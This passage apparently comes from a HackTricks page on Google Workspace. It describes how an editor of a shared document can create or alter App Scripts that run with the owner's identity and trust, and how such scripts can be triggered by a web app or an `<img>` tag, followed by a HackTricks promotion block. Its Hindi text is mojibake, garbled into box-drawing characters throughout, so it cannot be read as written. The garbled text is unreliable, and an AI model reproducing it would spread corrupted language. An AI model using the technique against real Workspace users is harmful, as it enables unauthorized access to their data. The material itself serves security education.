рдЗрд╕рд╕реЗ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЕрд▓рд░реНрдЯ рдИрдореЗрд▓ рдФрд░ рдЖрдкрдХреЗ рдореЛрдмрд╛рдЗрд▓ рдкрд░ рдПрдХ рдкреБрд╢ рд╕рдВрджреЗрд╢ рдмрдиреЗрдЧрд╛ рдЬреЛ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЪреЗрддрд╛рд╡рдиреА рджреЗрдЧрд╛ред
{% endhint %}



### рд╕рд╛рдЭрд╛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЕрдкреНрд░рдорд╛рдгрд┐рдд рдкреНрд░реЙрдореНрдкреНрдЯ рдмрд╛рдИрдкрд╛рд╕

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдЧрд░ рдХрд┐рд╕реА рдиреЗ рдЖрдкрдХреЗ рд╕рд╛рде рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ **рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛** рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рд╕рдВрдкрд╛рджрдХ рдкрд╣реБрдБрдЪ** рд╣реИ, рддреЛ рдЖрдк рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдЕрдВрджрд░ **App Scripts рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ **рдорд╛рд▓рд┐рдХ (рдирд┐рд░реНрдорд╛рддрд╛) App Script рдХрд╛ рдорд╛рд▓рд┐рдХ рд╣реЛрдЧрд╛**ред

{% hint style="warning" %}
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ **рдирд┐рд░реНрдорд╛рддрд╛ рдХрд┐рд╕реА рднреА App Script рдХрд╛ рдирд┐рд░реНрдорд╛рддрд╛ рдкреНрд░рддреАрдд рд╣реЛрдЧрд╛** рдЬреЛ рдХреЛрдИ рднреА рд╕рдВрдкрд╛рджрдХ рдкрд╣реБрдБрдЪ рд╡рд╛рд▓рд╛ рд╡реНрдпрдХреНрддрд┐ рдЙрд╕рдХреЗ рдЕрдВрджрд░ рдмрдирд╛рддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рдпрд╣ рднреА рдорддрд▓рдм рд╣реИ рдХрд┐ **App Script рдХреЛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рдХреЗ Workspace рдкрд░реНрдпрд╛рд╡рд░рдг рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред
{% endhint %}

{% hint style="danger" %}
рдЗрд╕рдХрд╛ рдпрд╣ рднреА рдорддрд▓рдм рд╣реИ рдХрд┐ рдЕрдЧрд░ рдПрдХ **App Script рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рдереА** рдФрд░ рд▓реЛрдЧреЛрдВ рдиреЗ **рдкрд╣реБрдБрдЪ рджреА рдереА**, рддреЛ рдХреЛрдИ рднреА рд╡реНрдпрдХреНрддрд┐ рдЬрд┐рд╕рдХреЗ рдкрд╛рд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкрд░ **рд╕рдВрдкрд╛рджрдХ** рдЕрдиреБрдорддрд┐ рд╣реИ, рд╡рд╣ рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рдкрд╣реБрдБрдЪ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред**\
рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд▓реЛрдЧреЛрдВ рдХреЛ App Script рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдФрд░ рдПрдХ рд╕рд╛рдл рдЪрд╛рд▓ рдпрд╣ рд╣реИ рдХрд┐ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдПрдХ рд╡реЗрдм рдРрдк рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░реЗрдВ**ред рдЬрдм **рд▓реЛрдЧ** рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдкрд╣рд▓реЗ рд╣реА App Script рдХреЛ **рдкрд╣реБрдБрдЪ рджреА** рд╣реИ, рд╡реЗрдм рдкреЗрдЬ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ **App Script рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВрдЧреЗ** (рдпрд╣ `<img>` рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ)ред
{% endhint %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
